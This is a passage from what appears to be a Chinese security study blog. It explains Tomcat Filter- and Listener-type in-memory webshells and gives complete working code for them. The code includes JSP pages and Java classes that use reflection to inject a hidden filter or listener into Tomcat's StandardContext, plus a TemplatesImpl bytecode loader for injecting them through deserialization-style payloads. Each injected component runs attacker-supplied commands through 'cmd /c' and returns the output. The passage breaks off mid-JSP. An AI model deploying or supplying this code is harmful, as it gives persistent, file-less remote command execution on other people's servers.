web.xml中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。\n从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。\n测试demo为了更好的理解Filter，写一个demo\ntestfilter.java\nimport javax.servlet.*;import java.io.IOException;public class testfilter implements Filter&#123;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;        System.out.println(&quot;filter初始化&quot;);    &#125;    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        System.out.println(&quot;dofilter&quot;);        filterChain.doFilter(servletRequest,servletResponse);    &#125;    @Override    public void destroy() &#123;    &#125;&#125;\n\nweb.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    &lt;filter&gt;        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;        &lt;filter-class&gt;testfilter&lt;/filter-class&gt;    &lt;/filter&gt;    &lt;filter-mapping&gt;        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;    &lt;servlet&gt;        &lt;!--servlet名字，和类名一致--&gt;        &lt;servlet-name&gt;test&lt;/servlet-name&gt;        &lt;!--class文件名，如果有包要加上包名--&gt;        &lt;servlet-class&gt;test&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;test&lt;/servlet-name&gt;        &lt;!--url--&gt;        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;\n\n然后访问一下 /filter\n成功触发过滤器\nFilter相关类from https://paper.seebug.org/1441/#tomcat\n\nFilter\n过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。\n\nFilterChain\n过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain\n\nFilterConfig\n过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。\n\nFilterDef\n过滤器的配置和描述\n\nApplicationFilterChain\n调用过滤器链\n\nApplicationFilterConfig\n获取过滤器\n\nApplicationFilterFactory\n组装过滤器链\n\nWebXml\n一个存放web.xml中内容的类\n\nContextConfig\n一个web应用的上下文配置类\n\nStandardContext\n一个web应用上下文(Context接口)的标准实现\n\nStandardWrapperValve\n一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。\n\nTomcat Filter调用流程首先 ContextConfig$configureContext 对 web.xml 进行解析，获取到 WebXml 实例\n然后直接看到 StandardWrapperValve ，在这里将会完成过滤器的组装\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n\n看到这行代码，发现 filterchain 是由 ApplicationFilterFactory$createFilterChain 创建的，跟进该方法\n前面的代码主要是初始化 filterchain 变量，这里使用 StandardWrapper$getParent 获取当前 Context 也就是当前运行的WEB应用，然后使用 Context 的 findFilterMaps 获取到 filterMaps\nfilterMaps 中存放了已定义的及自带的 filterMap ，而 filterMap 中存放了 filtername 及 url，然后看看 filter 的组装逻辑\nfor循环 遍历 filterMaps ，如果当前请求的 url 和 filterMap 中的 urlPatterns 相同，就会调用 findFilterConfig 方法寻找对应 filtername 的 FilterConfig ，如果找到就调用 addFilter 方法将 filterConfig 加入到 filterChain\n跟进 addFilter 方法，该方法首先遍历 filterChain ，看看要添加的 filter 是否已经存在。如果存在就直接 return\n如果n等于 filters 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 filters 。至此 filterChain 也就组装完成了，接着回到 StandardWrapperValve 执行 ApplicationFilterChain$doFilter\n然后跟进 doFilter 方法\n调用了 internalDoFilter 方法\n先获取 filterConfig ，然后通过 filterConfig.getFilter() 获取到 filter ，再调用 filter 的 doFilter 方法，就结束了 Filter 的调用。\n总结一下流程\n\n先从当前 Context 中获取到 filterMaps\n筛选出 urlPattern 与当前请求 url 相符合的 filtername\n根据 filtername 找到对应的 FilterConfig\n将 FilterConfig 加入到 filterChain\n调用 filterChain 的 internalDoFilter 遍历获取 FilterConfig\n然后获取 FiletrConfig 对应的 Filter ，并调用 Filter 的 doFilter\n\nfilter内存马注入理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 filter 注入。\n回想一下 filter 的获取流程，可以发现 filterMaps 是从当前 context 中获取到的\n那如果我们可以对这个 context 中存储的 filterMaps 进行修改是不是就可以注入自己的恶意 filter 了。\n那么怎么修改呢，我们先看一下这个 context ， StandardContext 有三个关于 filter 的成员变量\n\nfilterConfigs：存储 filterConfig 的 HashMap ， filterConfig 中又存储了 FilterDef 和 filter 对象\nfilterDefs：存放 FilterDef 的 HashMap ，FilterDef中存储着过滤器名，过滤器实例，匹配的url 等\nfilterMaps：存放 FilterMap 的 HashMap ， FilterMap 中主要存放了 FilterName 和对应的 URLPattern\n\n注入流程如下\n\n创建恶意 filter\n使用 FilterDef 封装恶意 filter\n将该 FilterDef 添加到 FilterDefs 和 FilterConfig\n建立恶意 filter 对应的 filterMap ，并将其加入到 filterMaps 中(将其放到最前面)\n\n大概代码\n//创建filter        Filter filter=new Filter() &#123;            @Override            public void init(FilterConfig filterConfig) throws ServletException &#123;            &#125;            @Override            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                HttpServletRequest req = (HttpServletRequest) servletRequest;                if (req.getParameter(&quot;cc&quot;) != null)&#123;                    byte[] bytes = new byte[1024];                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();                    ByteArrayOutputStream baos = new ByteArrayOutputStream();                    byte[] b = new byte[1024];                    int a = -1;                    while ((a = in.read(b)) != -1) &#123;                        baos.write(b, 0, a);                    &#125;                    servletResponse.getWriter().write(new String(baos.toByteArray()));                    return;                &#125;                filterChain.doFilter(servletRequest,servletResponse);            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;        //封装filter        String filtername=&quot;novic4&quot;;        FilterDef filterDef=new FilterDef();        filterDef.setFilter(filter);        filterDef.setFilterName(filtername);        filterDef.setFilterClass(filter.getClass().getName());        //将filterdef添加到filterdefs中        standardContext.addFilterDef(filterDef);        //将filterdef添加到filterconfig中        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);        constructor.setAccessible(true);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        //建立对应得filterMap        FilterMap filterMap = new FilterMap();        filterMap.addURLPattern(&quot;/*&quot;);        filterMap.setFilterName(filtername);        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3        filterMap.setDispatcher(DispatcherType.REQUEST.name());        //插入filterMaps，将其插到首位        standardContext.addFilterMapBefore(filterMap);        //添加到filterconfigs        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);        Configs.setAccessible(true);        Map filterConfigs = (Map) Configs.get(standardContext);        filterConfigs.put(filtername,filterConfig);\n\n要想修改这个 context ，就需要先获取到该 context,已知有三种获取方式\n\n将 servletcontext 转换成 StandardContext\nweb容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用\n\nServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);        // ApplicationContext 为 ServletContext 的实现类    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n通过Mbean获取context\n[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)\n\n从线程中获取StandardContext\n[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)\n\n这里使用第一种方式写一个内存马\n&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    //创建filter    Filter filter=new Filter() &#123;        @Override        public void init(FilterConfig filterConfig) throws ServletException &#123;        &#125;        @Override        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;            HttpServletRequest req = (HttpServletRequest) servletRequest;            if (req.getParameter(&quot;cc&quot;) != null)&#123;                byte[] bytes = new byte[1024];                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                servletResponse.getWriter().write(new String(baos.toByteArray()));                return;            &#125;            filterChain.doFilter(servletRequest,servletResponse);        &#125;        @Override        public void destroy() &#123;        &#125;    &#125;;    //封装filter    String filtername=&quot;novic4&quot;;    FilterDef filterDef=new FilterDef();    filterDef.setFilter(filter);    filterDef.setFilterName(filtername);    filterDef.setFilterClass(filter.getClass().getName());    //将filterdef添加到filterdefs中    standardContext.addFilterDef(filterDef);    //将filterdef添加到filterconfig中    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);    constructor.setAccessible(true);    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);    //建立对应得filterMap    FilterMap filterMap = new FilterMap();    filterMap.addURLPattern(&quot;/*&quot;);    filterMap.setFilterName(filtername);    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3    filterMap.setDispatcher(DispatcherType.REQUEST.name());    //插入filterMaps，将其插到首位    standardContext.addFilterMapBefore(filterMap);    //添加到filterconfigs    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    Configs.setAccessible(true);    Map filterConfigs = (Map) Configs.get(standardContext);    filterConfigs.put(filtername,filterConfig);    out.print(&quot;bingo&quot;);%&gt;\n\n\n\n不过中文回显还是有点问题\n","categories":["学习"]},{"title":"Tomcat内存马—Listener型","url":"/2023/06/14/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E2%80%94Listener%E5%9E%8B/","content":"前言之前学了 filter 型的内存马，现在继续学习 listener 型\n正文前面的 filter 内存马是通过动态注册恶意的 filter 来实现一个 webshell ，这个 listener 内存马原理其实也差不多，就是动态注册一个恶意的 listener 。\n构造恶意Listener这个恶意的 Listener 要实现一个webshell的功能，就需要获取到 request 对象，现在来看一下怎么构造出这个恶意 Listener\nrequestInitialized 方法只有一个ServletRequestEvent 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 ServletRequestEvent 对象中来获取 request 对象。\n可以看到该对象有一个 getServletRequest 方法，看起来就跟 request 对象有关\n可以看到返回了一个 ServletRequest 接口的实现类的对象，测试一下看看具体返回的哪个类的对象\n可以看到是 org.apache.catalina.connector.RequestFacade 的对象，看看他有哪些属性\n发现其有 request 属性是 Request 类型的，那么我们就可以通过反射来获取该属性的值\n开始构造恶意 Listener\nimport org.apache.catalina.connector.Request;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Response;import javax.servlet.Filter;import javax.servlet.ServletRequest;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.Field;public class Testlistener implements ServletRequestListener &#123;    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;    &#125;    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();        try &#123;            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);            requestf.setAccessible(true);            Request request= (Request) requestf.get(test);            Response response=request.getResponse();            String cmd=request.getParameter(&quot;cmd&quot;);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                response.getWriter().write(new String(baos.toByteArray()));            &#125;        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n\n成功\n实现动态注册Listener现在来理一下 Listener 的注册流程\n先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。\n在 StandardContext$listenerStart进行实例化，我们跟踪一下 listeners 的来源\nlisteners 是一个 String 类型的数组，存储了 listener 的名字,通过 findApplicationListeners 方法获取值\nresults 数组用来存储已经实例化的 listener 对象，然后继续看\n将 results 中的 listener 分类存放，我们的 TestListener 就被分到了 eventListeners 中\n然后调用 getApplicationEventListeners 获取 applicationEventListenersList ，就是已注册的 applicationEventListener ，并将其添加到我们的 eventListeners 中。之后再调用 setApplicationEventListeners 将eventListeners 设置为ApplicationEventListeners 。刚看到时我在想，为什么要将已有的applicationEventListener 取出来，然后再 set 呢，这不会重复吗，随后跟进一下 setApplicationEventListeners 方法的源码就知道了\npublic void setApplicationEventListeners(Object[] listeners) &#123;        this.applicationEventListenersList.clear();        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;            this.applicationEventListenersList.addAll(Arrays.asList(listeners));        &#125;    &#125;\n\n该方法首先会清空 applicationEventListenersList ，然后再进行添加。\n然后 instance 这个数组就会获取所有已注册的 lsitener ，且是已实例化的 listener ，然后就是一些其他的处理了，这里不再关注。\n继续看第二个断点\n可以看到对 requestInitialized 方法的调用是在 StandardContext$fireRequestInitEvent 中进行的，这个 listener 是从 instances 数组中得到的，而instances 又是调用getApplicationEventListeners 方法获取的\n那么其实我们如果将恶意 listener 添加到这个 list中就可以了，就像这样\nObject[] objects = standardContext.getApplicationEventListeners();List&lt;Object&gt; listeners = Arrays.asList(objects);List&lt;Object&gt; listenerList = new ArrayList(listeners);listenerList.add(new Testlistener());standardContext.setApplicationEventListeners(listenerList.toArray());\n\nJSP实现内存马注入先使用 JSP 实现内存马的注入\n&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Testlistener implements ServletRequestListener &#123;        @Override        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;        &#125;        @Override        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();            try &#123;                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);                requestf.setAccessible(true);                Request request= (Request) requestf.get(test);                Response response=request.getResponse();                String cmd=request.getParameter(&quot;cmd&quot;);                System.out.println(cmd);                if(cmd!=null)&#123;                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();                    ByteArrayOutputStream baos = new ByteArrayOutputStream();                    byte[] b = new byte[1024];                    int a = -1;                    while ((a = in.read(b)) != -1) &#123;                        baos.write(b, 0, a);                    &#125;                    response.getWriter().write(new String(baos.toByteArray()));                &#125;            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;%&gt;&lt;%    //获取StandardContext    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(true);    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);        //注入listener    Object[] objects = standardContext.getApplicationEventListeners();    List&lt;Object&gt; listeners = Arrays.asList(objects);    List&lt;Object&gt; listenerList = new ArrayList(listeners);    listenerList.add(new Testlistener());    standardContext.setApplicationEventListeners(listenerList.toArray());%&gt;\n\n可以执行命令并获取回显\n动态加载字节码实现内存马注入用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。\n测试demo\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.xml.transform.TransformerConfigurationException;import java.io.IOException;import java.lang.reflect.Field;import java.util.Base64;public class ListenerShell extends HttpServlet&#123;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        String test=req.getParameter(&quot;test&quot;);        byte[] bytecode= Base64.getDecoder().decode(test);        byte[][] bytee= new byte[][]&#123;bytecode&#125;;        TemplatesImpl templates=new TemplatesImpl();        try &#123;            setFildValue(templates,&quot;_bytecodes&quot;,bytee);            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());            templates.newTransformer();        &#125; catch (TransformerConfigurationException e) &#123;            e.printStackTrace();        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        super.doGet(req, resp);    &#125;    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;        Field field=obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj,value);    &#125;&#125;\n\n就是利用 TemplatesImpl 加载字节码，试一下\n现在来编写POC，这里我们还是用之前学的 lastServicedRequest 的方式获取回显，过程还是分为两不\n\n将 request 和 response 对象分别存放进lastServicedRequest 和 lastServicedResponse 对象\n将 request 从 lastServicedRequest取出，并通过其动态注册恶意 listener\n\n第一步可以直接用之前的代码\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.lang.reflect.Field;public class Echoinject extends AbstractTranslet &#123;    static &#123;        try &#123;            //修改WRAP_SAME_OBJECT的值为true            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);            WRAP_SAME_OBJECT.setAccessible(true);            //修改final变量，否则不能修改final的属性            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;                WRAP_SAME_OBJECT.setBoolean(null, true);            &#125;            //初始化lastServicedRequest            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);            lastServicedRequest.setAccessible(true);            if (lastServicedRequest.get(null) == null) &#123;                lastServicedRequest.set(null, new ThreadLocal());            &#125;            //初始化初始化lastServicedResponse            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);            lastServicedResponse.setAccessible(true);            if (lastServicedResponse.get(null) == null) &#123;                lastServicedResponse.set(null, new ThreadLocal());            &#125;        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\n写一下第二步的代码\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Response;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.StandardContext;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.util.ArrayList;import java.util.Arrays;import javax.servlet.ServletContext;import javax.servlet.ServletRequest;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import java.lang.reflect.Field;import java.util.List;public class ListenerInject extends AbstractTranslet implements ServletRequestListener &#123;    static &#123;        //获取request和response        try &#123;            Field context= null;            context = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;).getDeclaredField(&quot;lastServicedRequest&quot;);            context.setAccessible(true);            ThreadLocal threadLocal=(ThreadLocal) context.get(null);            ServletRequest request=null;            if(threadLocal!=null&amp;&amp;threadLocal.get()!=null)&#123;                request= (ServletRequest) threadLocal.get();            &#125;            if(request!=null)&#123;                //获取context                ServletContext servletContext=request.getServletContext();                if(servletContext!=null)&#123;                    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);                    appctx.setAccessible(true);                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);                    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);                    stdctx.setAccessible(true);                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);                    //注入listener                    Object[] objects = standardContext.getApplicationEventListeners();                    List&lt;Object&gt; listeners = Arrays.asList(objects);                    List&lt;Object&gt; listenerList = new ArrayList(listeners);                    listenerList.add(new ListenerInject());                    standardContext.setApplicationEventListeners(listenerList.toArray());                &#125;            &#125;        &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    @Override    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;    &#125;    @Override    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();        try &#123;            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);            requestf.setAccessible(true);            Request request= (Request) requestf.get(test);            Response response=request.getResponse();            String cmd=request.getParameter(&quot;cmd&quot;);            System.out.println(cmd);            if(cmd!=null)&#123;                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();                ByteArrayOutputStream baos = new ByteArrayOutputStream();                byte[] b = new byte[1024];                int a = -1;                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                response.getWriter().write(new String(baos.toByteArray()));            &#125;        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n\n成功注入，over\n另一种动态注入listener的方式我发现有一个addApplicationEventListener 方法，可以直接将对象插进去\nstandardContext.addApplicationEventListener(new Testlistener());\n\n所以我们的jsp马就可以简化成\n&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%    class Testlistener implements ServletRequestListener &#123;        @Override        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;        &#125;        @Override        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();            try &#123;                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);                requestf.setAccessible(true);                Request request= (Request) requestf.get(test);                Response response=request.getResponse();                String cmd=request.getParameter(&quot;cmd&quot;);                System.out.println(cmd);                if(cmd!=null)&#123;                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();                    ByteArrayOutputStream baos = new ByteArrayOutputStream();                    byte[] b = new byte[1024];                    int a = -1;                    while ((a = in.read(b)) != -1) &#123;                        baos.write(b, 0, a);                    &#125;                    response.getWriter().write(new String(baos.toByteArray()));                &#125;            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;%&gt;&lt;%    //获取StandardContext    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) 